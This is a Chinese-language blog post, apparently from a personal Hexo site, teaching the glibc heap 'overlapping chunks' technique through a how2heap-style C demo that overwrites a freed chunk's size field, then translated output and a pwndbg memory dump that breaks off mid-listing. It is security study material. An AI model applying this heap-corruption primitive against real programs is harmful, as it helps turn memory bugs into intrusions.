@@ -1,0 +1,1189 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+    
+
+<!-- keywords -->
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="author" content="John Doe">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="John Doe">
+    
+        <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="overlapping chunkschunk extend 是堆漏洞的一种常见利用手法，通过extend可以实现chunk overlapping（块重叠）的效果。这种利用方法需要以下的时机和条件：  程序中存在基于堆的漏洞 漏洞可以控制 chunk header 中的数据  拓展被释放块123456789101112131415161718192021222324252627282930313">
+<meta property="og:type" content="article">
+<meta property="og:title" content="overlapping chunks">
+<meta property="og:url" content="http://example.com/2022/01/08/overlapping%20chunks/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="overlapping chunkschunk extend 是堆漏洞的一种常见利用手法，通过extend可以实现chunk overlapping（块重叠）的效果。这种利用方法需要以下的时机和条件：  程序中存在基于堆的漏洞 漏洞可以控制 chunk header 中的数据  拓展被释放块123456789101112131415161718192021222324252627282930313">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201082240984.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201082240985.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201082240986.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201082240987.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201082240988.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201082240989.png">
+<meta property="article:published_time" content="2022-01-08T14:38:10.230Z">
+<meta property="article:modified_time" content="2022-01-08T14:47:38.537Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201082240984.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <link rel="icon" href="/assets/favicon.ico">
+    
+    <title>overlapping chunks · 渐渐的博客</title>
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+    (function (w) {
+        'use strict'
+        // rel=preload support test
+        if (!w.loadCSS) {
+            w.loadCSS = function () {}
+        }
+        // define on the loadCSS obj
+        var rp = (loadCSS.relpreload = {})
+        // rel=preload feature support test
+        // runs once and returns a function for compat purposes
+        rp.support = (function () {
+            var ret
+            try {
+                ret = w.document.createElement('link').relList.supports('preload')
+            } catch (e) {
+                ret = false
+            }
+            return function () {
+                return ret
+            }
+        })()
+
+        // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+        // then change that media back to its intended value on load
+        rp.bindMediaToggle = function (link) {
+            // remember existing media attr for ultimate state, or default to 'all'
+            var finalMedia = link.media || 'all'
+
+            function enableStylesheet() {
+                link.media = finalMedia
+            }
+
+            // bind load handlers to enable media
+            if (link.addEventListener) {
+                link.addEventListener('load', enableStylesheet)
+            } else if (link.attachEvent) {
+                link.attachEvent('onload', enableStylesheet)
+            }
+
+            // Set rel and non-applicable media type to start an async request
+            // note: timeout allows this to happen async to let rendering continue in IE
+            setTimeout(function () {
+                link.rel = 'stylesheet'
+                link.media = 'only x'
+            })
+            // also enable media after 3 seconds,
+            // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+            setTimeout(enableStylesheet, 3000)
+        }
+
+        // loop through link elements in DOM
+        rp.poly = function () {
+            // double check this to prevent external calls from running
+            if (rp.support()) {
+                return
+            }
+            var links = w.document.getElementsByTagName('link')
+            for (var i = 0; i < links.length; i++) {
+                var link = links[i]
+                // qualify links to those with rel=preload and as=style attrs
+                if (
+                    link.rel === 'preload' &&
+                    link.getAttribute('as') === 'style' &&
+                    !link.getAttribute('data-loadcss')
+                ) {
+                    // prevent rerunning on link
+                    link.setAttribute('data-loadcss', true)
+                    // bind listeners to toggle media back
+                    rp.bindMediaToggle(link)
+                }
+            }
+        }
+
+        // if unsupported, run the polyfill
+        if (!rp.support()) {
+            // run once at least
+            rp.poly()
+
+            // rerun poly on an interval until onload
+            var run = w.setInterval(rp.poly, 500)
+            if (w.addEventListener) {
+                w.addEventListener('load', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            } else if (w.attachEvent) {
+                w.attachEvent('onload', function () {
+                    rp.poly()
+                    w.clearInterval(run)
+                })
+            }
+        }
+
+        // commonjs
+        if (typeof exports !== 'undefined') {
+            exports.loadCSS = loadCSS
+        } else {
+            w.loadCSS = loadCSS
+        }
+    })(typeof global !== 'undefined' ? global : this)
+</script>
+
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+</style>
+
+    <link rel="preload" href="/css/style.css?v=20210823" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="/css/dark.css?v=20210823" as="style">
+    <link rel="stylesheet" href="/css/dark.css" media="(prefers-color-scheme: dark)">
+    <link rel="stylesheet" href="/css/mobile.css?v=20210823" media="(max-width: 960px)">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" as="script">
+    <link rel="preload" href="/scripts/main.js?v=20210823" as="script">
+    <link rel="preload" href="/scripts/dark.js?v=20210823" as="script">
+    <link rel="preload" href="/font/Oswald-Regular.ttf" as="font" crossorigin>
+    <link rel="preload" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" as="font" crossorigin>
+    <!-- algolia -->
+    
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ == undefined) {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js" />')
+        }
+    </script>
+    
+        <body class="post-body">
+    
+        <!-- header -->
+        <header class="header header-mobile">
+    <!-- top read progress line -->
+    <div class="header-element">
+        <div class="read-progress"></div>
+    </div>
+    <!-- sidebar menu button -->
+    <div class="header-element">
+        
+            <div class="header-sidebar-menu">
+        
+            
+                <div style="padding-left: 1px;">&#xe775;</div>
+            
+        </div>
+    </div>
+    <!-- header actions -->
+    <div class="header-actions">
+        <!-- theme mode switch button -->
+        <span class="header-theme-btn header-element">
+            <i class="fas fa-adjust"></i>
+        </span>
+        <!-- back to home page text -->
+        <span class="home-link header-element">
+            <a href=/>渐渐的博客</a>
+        </span>
+    </div>
+    <!-- toggle banner for post layout -->
+    
+        
+            <div class="banner">
+        
+            <div class="blog-title header-element">
+                <a href="/">渐渐的博客</a>
+            </div>
+            <div class="post-title header-element">
+                <a href="#" class="post-name">overlapping chunks</a>
+            </div>
+        </div>
+    
+</header>
+
+        <!-- fixed footer -->
+        <footer class="footer-fixed">
+    <!-- back to top button -->
+    <div class="footer-fixed-element">
+        
+            <div class="back-top back-top-hidden">
+        
+        
+            <div>&#xe639;</div>
+        
+        </div>
+    </div>
+</footer>
+
+        <!-- wrapper -->
+        <div class="wrapper">
+            <div class="site-intro" style="
+
+
+
+
+
+
+
+    height:50vh;
+
+">
+    
+    <!-- 主页  -->
+    
+        
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/wlop1.jpeg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+                overlapping chunks
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+                
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页 meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">2.9k</span>Reading time: <span class="post-count reading-time">14 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <!-- 撰写日期 -->
+                    <span class="iconfont-archer post-intro-calander">&#xe676;</span>
+                    <span class="post-intro-time">2022/01/08</span>
+                    <!-- busuanzi -->
+                    
+                        <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                            <span class="iconfont-archer post-intro-busuanzi">&#xe602;</span>
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    
+                    <!-- 文章分享 -->
+                    <span class="share-wrapper">
+                        <span class="iconfont-archer share-icon">&#xe71d;</span>
+                        <span class="share-text">Share</span>
+                        <ul class="share-list">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+
+            <script>
+  // get user agent
+  function getBrowserVersions() {
+    var u = window.navigator.userAgent
+    return {
+      userAgent: u,
+      trident: u.indexOf('Trident') > -1, //IE内核
+      presto: u.indexOf('Presto') > -1, //opera内核
+      webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+      gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+      mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+      ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+      android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+      iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+      iPad: u.indexOf('iPad') > -1, //是否为iPad
+      webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+      weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+      uc: u.indexOf('UCBrowser') > -1, //是否为android下的UC浏览器
+    }
+  }
+  var browser = {
+    versions: getBrowserVersions(),
+  }
+  console.log('userAgent: ' + browser.versions.userAgent)
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded')
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document
+        .getElementsByClassName('intro-title')[0]
+        .classList.add('intro-fade-in')
+      document
+        .getElementsByClassName('intro-subtitle')[0]
+        .classList.add('intro-fade-in')
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in')
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb() {
+    if (browser.versions.uc) {
+      console.log('UCBrowser')
+      fontLoaded()
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular'],
+        },
+        loading: function () {
+          // 所有字体开始加载
+          // console.log('font loading');
+        },
+        active: function () {
+          // 所有字体已渲染
+          fontLoaded()
+        },
+        inactive: function () {
+          // 字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout')
+          fontLoaded()
+        },
+        timeout: 5000, // Set the timeout to two seconds
+      })
+    }
+  }
+
+  function asyncErr() {
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document,
+      t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0]
+    o.src = u
+    if (cb) {
+      o.addEventListener(
+        'load',
+        function (e) {
+          cb(null, e)
+        },
+        false
+      )
+    }
+    if (err) {
+      o.addEventListener(
+        'error',
+        function (e) {
+          err(null, e)
+        },
+        false
+      )
+    }
+    s.parentNode.insertBefore(o, s)
+  }
+
+  var asyncLoadWithFallBack = function (arr, success, reject) {
+    var currReject = function () {
+      reject()
+      arr.shift()
+      if (arr.length) async(arr[0], success, currReject)
+    }
+
+    async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack(
+    [
+      'https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js',
+      'https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js',
+      "/lib/webfontloader.min.js",
+    ],
+    asyncCb,
+    asyncErr
+  )
+</script>
+
+            <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+            <div class="container container-unloaded">
+                <main class="main post-page">
+    <article class="article-entry">
+        <h2 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping chunks"></a>overlapping chunks</h2><p>chunk extend 是堆漏洞的一种常见利用手法，通过extend可以实现chunk overlapping（块重叠）的效果。这种利用方法需要以下的时机和条件：</p>
+<ul>
+<li>程序中存在基于堆的漏洞</li>
+<li>漏洞可以控制 chunk header 中的数据</li>
+</ul>
+<h3 id="拓展被释放块"><a href="#拓展被释放块" class="headerlink" title="拓展被释放块"></a>拓展被释放块</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"> A simple tale of overlapping chunk.</span></span><br><span class="line"><span class="comment"> This technique is taken from</span></span><br><span class="line"><span class="comment"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc , <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">intptr_t</span> *p1,*p2,*p3,*p4;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThis is a simple chunks overlapping problem\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s start to allocate 3 chunks on the heap\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	p1 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	p2 = <span class="built_in">malloc</span>(<span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	p3 = <span class="built_in">malloc</span>(<span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The 3 chunks have been allocated here:\np1=%p\np2=%p\np3=%p\n&quot;</span>, p1, p2, p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(p1, <span class="string">&#x27;1&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p2, <span class="string">&#x27;2&#x27;</span>, <span class="number">0x100</span> - <span class="number">8</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">0x80</span> - <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s free the chunk p2\n&quot;</span>);</span><br><span class="line">	<span class="built_in">free</span>(p2);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk p2 is now in the unsorted bin ready to serve possible\nnew malloc() of its size\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now let&#x27;s simulate an overflow that can overwrite the size of the\nchunk freed p2.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;For a toy program, the value of the last 3 bits is unimportant;&quot;</span></span><br><span class="line">		<span class="string">&quot; however, it is best to maintain the stability of the heap.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&quot;</span></span><br><span class="line">		<span class="string">&quot; to assure that p1 is not mistaken for a free chunk.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> evil_chunk_size = <span class="number">0x181</span>;</span><br><span class="line">	<span class="keyword">int</span> evil_region_size = <span class="number">0x180</span> - <span class="number">8</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We are going to set the size of chunk p2 to to %d, which gives us\na region size of %d\n&quot;</span>,</span><br><span class="line">		 evil_chunk_size, evil_region_size);</span><br><span class="line"></span><br><span class="line">	*(p2<span class="number">-1</span>) = evil_chunk_size; <span class="comment">// we are overwriting the &quot;size&quot; field of chunk p2</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s allocate another chunk with a size equal to the data\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;size of the chunk p2 injected size\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This malloc will be served from the previously freed chunk that\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;is parked in the unsorted bin which size has been modified by us\n&quot;</span>);</span><br><span class="line">	p4 = <span class="built_in">malloc</span>(evil_region_size);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\np4 has been allocated at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p4, (<span class="keyword">char</span> *)p4+evil_region_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 starts at %p and ends at %p\n&quot;</span>, (<span class="keyword">char</span> *)p3, (<span class="keyword">char</span> *)p3+<span class="number">0x80</span><span class="number">-8</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 should overlap with p3, in this case p4 includes all p3.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow everything copied inside chunk p4 can overwrites data on\nchunk p3,&quot;</span></span><br><span class="line">		<span class="string">&quot; and data written to chunk p3 can overwrite data\nstored in the p4 chunk.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s run through an example. Right now, we have:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIf we memset(p4, &#x27;4&#x27;, %d), we have:\n&quot;</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">memset</span>(p4, <span class="string">&#x27;4&#x27;</span>, evil_region_size);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nAnd if we then memset(p3, &#x27;3&#x27;, 80), we have:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(p3, <span class="string">&#x27;3&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p4 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p4);</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;p3 = %s\n&quot;</span>, (<span class="keyword">char</span> *)p3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">这是一个简单的块重叠问题</span><br><span class="line">让我们开始在堆上分配<span class="number">3</span>个块</span><br><span class="line">这<span class="number">3</span>个区块被分配在这里:</span><br><span class="line">p1 = <span class="number">0x107c010</span></span><br><span class="line">p2 = <span class="number">0x107c110</span></span><br><span class="line">p3 = <span class="number">0x107c210</span></span><br><span class="line">现在让我们释放块p2</span><br><span class="line">p2被放到unsorted bin中，准备提供可能的服务</span><br><span class="line">新<span class="built_in">malloc</span>()一个p2的大小的块</span><br><span class="line">现在，让我们模拟一个溢出，它可以覆盖已经被释放的p2。</span><br><span class="line">对于一个玩具程序，最后<span class="number">3</span>位的值是不重要的;但是，最好保持堆的稳定性。</span><br><span class="line">为了实现这种稳定性，我们将把最低有效位标记为<span class="number">1</span> (prev_inuse)，以确保p1不会被误认为是一个空闲块。</span><br><span class="line">我们将chunk p2的大小设置为<span class="number">385</span>，这将给我们一个<span class="number">376</span>的区域大小</span><br><span class="line">现在，让我们分配另一个块，其大小等于p2注入的块的数据大小</span><br><span class="line">这个<span class="built_in">malloc</span>将由之前释放的块提供，该块被停在unsorted bin中，大小已被我们修改</span><br><span class="line">P4已在<span class="number">0x107c110</span>处分配，并在<span class="number">0x107c288</span>处结束</span><br><span class="line">P3从<span class="number">0x107c210</span>开始，到<span class="number">0x107c288</span>结束</span><br><span class="line">P4应该与p3重叠，在这种情况下P4包含了所有的p3。</span><br><span class="line">现在，在p4块内复制的所有数据都可以覆盖p3块上的数据，而写入p3块的数据可以覆盖存储在p4块上的数据。</span><br><span class="line">让我们看一个例子。现在，我们有:</span><br><span class="line">p4 = x&#123;$��</span><br><span class="line">p3 = <span class="number">333333333333333333333333333333333333333333333333333333333333333333333333333</span>  <span class="number">333333333333333333333333333333333333333333333333333333333333333333333333333</span>�</span><br><span class="line">如果<span class="built_in">memset</span>(p4， <span class="string">&#x27;4&#x27;</span>， <span class="number">376</span>)，则有:</span><br><span class="line">p4 =<span class="number">444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444</span>  <span class="number">444444444444444444444444444444444444444444444444444444444444</span>�</span><br><span class="line">p3 = <span class="number">444444444444444444444444444444444444444444444444444444444444444444444444444</span>  <span class="number">444444444444444444444444444444444444444444444444444444444444444444444444444</span>�</span><br><span class="line">如果我们<span class="built_in">memset</span>(p3， <span class="string">&#x27;3&#x27;</span>， <span class="number">80</span>)，我们有:</span><br><span class="line">p4 =<span class="number">444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444444433333333333333333333333333333333333333333333333333333333333</span>  <span class="number">333333333333333333334444444444444444444444444444444444444444</span>�</span><br><span class="line">p3 = <span class="number">333333333333333333333333333333333333333333333333333333333333333333333333333</span>  <span class="number">333333333333333333333333333333333333333333333333333333333333333333333333333</span>�</span><br></pre></td></tr></table></figure>
+
+<p>首先分配三个chunk，p1=0x101，p2=0x101，p3=0x81;</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202201082240984.png" alt="image-20220108213827344"></p>
+<p>free 掉 p2，这时候 p2 被放到了 unsorted bin 中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x603100</span></span><br><span class="line"><span class="number">0x603100</span>:	<span class="number">0x3131313131313131</span>	<span class="number">0x0000000000000101</span></span><br><span class="line"><span class="number">0x603110</span>:	<span class="number">0x00007ffff7dd1b78</span>	<span class="number">0x00007ffff7dd1b78</span></span><br><span class="line"><span class="number">0x603120</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603130</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603140</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603150</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603160</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603170</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603180</span>:	<span class="number">0x3232323232323232</span>	<span class="number">0x3232323232323232</span></span><br><span class="line"><span class="number">0x603190</span>:	<span class="number">0x3232323232323232</span>	<span 